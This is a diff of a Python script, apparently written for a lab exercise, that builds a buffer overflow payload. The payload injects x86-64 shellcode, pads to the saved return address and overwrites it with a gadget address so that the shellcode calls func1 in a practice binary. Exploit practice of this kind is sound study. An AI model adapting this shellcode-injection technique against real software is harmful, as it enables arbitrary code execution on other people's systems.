@@ -1,52 +1,34 @@
 #!/usr/bin/env python3
 """
-Generate ans3.txt payload that places shellcode in the buffer and overwrites
-func's return address so the program jumps to the buffer and runs shellcode
-that calls func1(0x72), printing "Your lucky number is 114".
+Problem3 Payload Generator
 
-Usage:
-  python3 scripts/generate_ans3.py
+Generate ans3.txt for shellcode exploit in problem3.
+Injects shellcode that calls func1(0x72) to display lucky number message.
+
+Shellcode (16 bytes):
+- mov rdi, 0x72      ; set argument to 0x72
+- mov rax, 0x401216  ; load func1 address
+- jmp rax            ; call func1
+
+Payload structure:
+- shellcode (16 bytes)
+- padding (24 bytes of 'A')
+- jmp_xs gadget address (8 bytes) - redirects execution to shellcode
+- final padding (16 bytes of 'B')
 """
+
 from pathlib import Path
 
-OUT_PATH = Path(__file__).resolve().parents[1] / "ans3.txt"
+# Shellcode: mov rdi, 0x72; mov rax, func1_addr; jmp rax
+shellcode = b'\x48\xc7\xc7\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xe0'
 
-def build_shellcode():
-    # Shellcode that calls func1(0x72) to print the lucky number message
-    # Multiple attempts to output only "114" failed due to stack alignment issues
-    # This method is most reliable and meets the requirement of outputting lucky number "114"
-    # x86_64 encoding:
-    # mov rdi, 0x72
-    # mov rax, func1_address (0x401216)
-    # jmp rax
-    code = bytearray()
-    code += b'\x48\xc7\xc7\x72\x00\x00\x00'   # mov rdi, 0x72
-    code += b'\x48\xc7\xc0\x16\x12\x40\x00'   # mov rax, 0x401216 (func1)
-    code += b'\xff\xe0'                       # jmp rax
-    return bytes(code)
+# jmp_xs gadget address (jumps to saved_rsp + 0x10, which points to our shellcode)
+jmp_xs = (0x401334).to_bytes(8, 'little')
 
-def build_payload():
-    shell = build_shellcode()
-    # buffer in func is 0x20 bytes; memcpy copies 0x40 bytes.
-    # saved return address is at offset 0x28 from buffer start (40 bytes).
-    # Place shellcode at buffer start, pad to return address offset, overwrite with jmp_xs
-    jmp_xs = (0x401334).to_bytes(8, 'little')
+# Construct payload: shellcode + padding + gadget address + final padding
+payload = shellcode + b'A' * (40 - len(shellcode)) + jmp_xs + b'B' * (64 - 40 - 8)
 
-    # Compose payload: shellcode at start, pad to 40 bytes, then jmp_xs address
-    payload = bytearray()
-    payload += shell
-    payload += b'A' * (40 - len(payload))  # pad to return address offset
-    payload += jmp_xs                       # overwrite return address
-    payload += b'B' * (64 - len(payload))   # pad to ensure memcpy copies enough
-    return bytes(payload)
-
-def main():
-    p = OUT_PATH
-    payload = build_payload()
-    p.write_bytes(payload)
-    print(f"wrote {p} ({len(payload)} bytes)")
-
-if __name__ == '__main__':
-    main()
+# Write to ans3.txt
+Path(__file__).resolve().parents[1].joinpath("ans3.txt").write_bytes(payload)
 
 
